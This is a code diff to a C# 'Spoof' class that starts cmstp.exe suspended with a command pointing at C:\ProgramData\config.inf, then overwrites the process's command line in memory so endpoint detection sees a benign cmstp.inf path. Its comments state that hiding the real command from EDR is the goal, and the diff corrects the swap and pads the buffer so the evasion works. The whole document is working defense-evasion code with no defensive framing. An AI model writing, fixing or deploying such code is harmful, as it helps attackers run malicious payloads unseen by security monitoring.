@@ -111,8 +111,12 @@ public static class Spoof
 
     public static void Go()
     {
+        // realCmd    -> what cmstp actually processes (passed to CreateProcessW)
+        // spoofedCmd -> what EDR sees in Win32_Process.CommandLine (PEB-overwritten)
+        // Pad realCmd with trailing spaces so its UTF-16 buffer fits the original
+        // CommandLine allocation; cmstp's argv parser ignores trailing whitespace.
         string spoofedCmd = "cmstp.exe /au /s C:\\Windows\\System32\\cmstp.inf";
-        string realCmd = "cmstp.exe /au /s C:\\ProgramData\\config.inf";
+        string realCmd    = "cmstp.exe /au /s C:\\ProgramData\\config.inf    ";
 
         STARTUPINFO si = new STARTUPINFO();
         si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
@@ -120,7 +124,7 @@ public static class Spoof
         PROCESS_INFORMATION pi;
 
         Log("[*] Creating suspended cmstp.exe...");
-        if (!CreateProcessW(null, spoofedCmd, IntPtr.Zero, IntPtr.Zero, false,
+        if (!CreateProcessW(null, realCmd, IntPtr.Zero, IntPtr.Zero, false,
             CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi))
         {
             int err = Marshal.GetLastWin32Error();
@@ -170,7 +174,7 @@ public static class Spoof
         }
         Log("[+] Command line pointer read");
 
-        byte[] newCmdBytes = Encoding.Unicode.GetBytes(realCmd);
+        byte[] newCmdBytes = Encoding.Unicode.GetBytes(spoofedCmd);
         IntPtr bufferPtr = Marshal.ReadIntPtr(cmdBuffer, 8);
 
         int written;
@@ -182,7 +186,7 @@ public static class Spoof
             CloseHandle(pi.hThread);
             return;
         }
-        Log("[+] Command line overwritten: config.inf");
+        Log("[+] Command line overwritten: cmstp.inf");
 
         byte[] lengthBytes = BitConverter.GetBytes(newCmdBytes.Length);
         byte[] maxLengthBytes = BitConverter.GetBytes(newCmdBytes.Length);
